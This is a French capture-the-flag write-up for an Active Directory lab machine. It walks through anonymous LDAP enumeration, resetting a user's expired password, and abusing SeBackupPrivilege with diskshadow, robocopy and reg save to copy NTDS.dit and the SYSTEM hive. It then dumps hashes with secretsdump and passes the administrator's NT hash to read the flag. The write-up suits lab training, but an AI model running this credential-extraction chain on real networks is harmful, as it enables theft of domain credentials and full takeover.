Nmap de la box :

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-13 01:11:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal 
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

On tente de voir si on peut se connecter 

![i](Images/20241213023917.png)

On a une connexion valide sans identifiant.
On tente d'énumerer les users ou les shares avec --users pui --shares mais sans succès :

![i][20241213024456.png]

Par contre avec ldap on obtient un retour pertinent :

![i][20241213024523.png]

Ensuite on obtient quelque chose d'encore plus pertinent graĉe au module get-desc-users de netexec en utilisant cette commande :
nxc ldap 10.10.126.10 -u "" -p "" -M get-desc-users  

![i][20241213024833.png]

Le mdp qu'on obtient n'est pas valide pour aucun utilisateur
Par contre on repère un msg d'erreur intéressant pour l'utilisateur Caroline.Robinson :

![i][20241213031525.png]

Le mdp est valide pour elle apparement mais elle doit changer de mdp.

Grâce à cette commande on change son mdp à Password123 :
smbpasswd -r 10.10.126.10 -U caroline.robinson 

On vérifie que cela a marché et ensuite on regarde les privilèges associés à l'utilisateur en exécutant "whoami /priv" grâce à cette commande :

nxc winrm 10.10.126.10 -u caroline.robinson -p "Password123" -X "whoami /priv" 

![i][20241213061303.png]

On remarque directement le privilège SeBackupPrivilege.
On va utiliser cela pour récupérer le fichier NTDS.dit 

On met ça dans un fichier raj.dsh :
```
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

On fait cette commande :
```
unix2dos raj.dsh
```

Puis sur la machine via evil-winrm :
```
cd C:\Temp
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit
```

On aura aussi besoin du fichier system pour déchiffrer le NTDS.dit

```
reg save hklm\system c:\Temp\system
```

On télécharge les deux fichiers grâce à la commande download dans evil-winrm
```
download ntds.dit
download system
```

On utilise secretsdump pour pour extraire les hash des utilisateurs :
```
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

![i][20241213062005.png]

On utilise le hash NT de l'administrateur pour récupérer le dernier flag grâce à cette commande :

 nxc winrm 10.10.126.10 -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d -X "cat C:\Users\Administrator\Desktop\root.txt"
 
![i][20241213062049.png]